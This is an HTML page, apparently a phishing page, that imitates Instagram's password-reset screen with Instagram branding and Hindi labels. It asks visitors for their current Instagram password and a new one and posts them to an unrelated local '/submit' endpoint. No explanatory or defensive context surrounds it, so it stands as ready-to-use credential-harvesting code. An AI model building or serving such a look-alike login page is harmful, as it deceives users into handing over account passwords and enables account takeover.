<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password • Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; text-align: center; }
        .logo img { width: 60px; margin-bottom: 20px; }
        h2 { font-size: 17px; color: #262626; margin-bottom: 10px; }
        p { font-size: 13px; color: #8e8e8e; margin-bottom: 20px; }
        form { display: flex; flex-direction: column; text-align: left; }
        label { font-size: 12px; color: #262626; margin-bottom: 5px; font-weight: bold; }
        input { background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 10px; margin-bottom: 15px; font-size: 12px; outline: none; }
        /* Button default mein gray rahega */
        button { background-color: #b2dffc; border: none; border-radius: 4px; color: white; padding: 8px; font-weight: bold; cursor: not-allowed; transition: 0.3s; }
        /* Jab enable hoga tab Blue ho jayega */
        button.active { background-color: #0095f6; cursor: pointer; }
        .error { color: red; font-size: 12px; margin-bottom: 10px; display: none; text-align: center; }
    </style>
</head>
<body>

<div class="box">
    <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Insta"></div>
    <h2>मज़बूत पासवर्ड बनाएँ</h2>
    <p>पासवर्ड कम से कम 6 अक्षरों का होना चाहिए।</p>
    <form id="resetForm" action="/submit" method="POST">
        <label>पुराना Instagram पासवर्ड</label>
        <input type="password" name="curr_p" id="current" placeholder="Current Password" required>
        <label>नया पासवर्ड</label>
        <input type="password" name="new_p" id="newpass" placeholder="New Password" required>
        <label>नया पासवर्ड दोबारा डालें</label>
        <input type="password" name="conf_p" id="confirm" placeholder="Confirm Password" required>
        <button type="submit" id="btn" disabled>Reset Password</button>
    </form>
</div>

<script>
    const inputs = document.querySelectorAll('input');
    const btn = document.getElementById('btn');
    const newPass = document.getElementById('newpass');
    const confirmPass = document.getElementById('confirm');

    // Teeno fields check karne ka function
    function validateForm() {
        let allFilled = true;
        inputs.forEach(input => {
            if(input.value.trim() === "") allFilled = false;
        });

        if(allFilled) {
            btn.disabled = false;
            btn.classList.add('active'); // Blue Highlight
        } else {
            btn.disabled = true;
            btn.classList.remove('active');
        }
    }

    inputs.forEach(input => input.addEventListener('input', validateForm));

    document.getElementById('resetForm').addEventListener('submit', function(e) {
        if (newPass.value !== confirmPass.value) {
            e.preventDefault();
            alert("Password doesn't Match!");
        }
    });
</script>
</body>
</html>
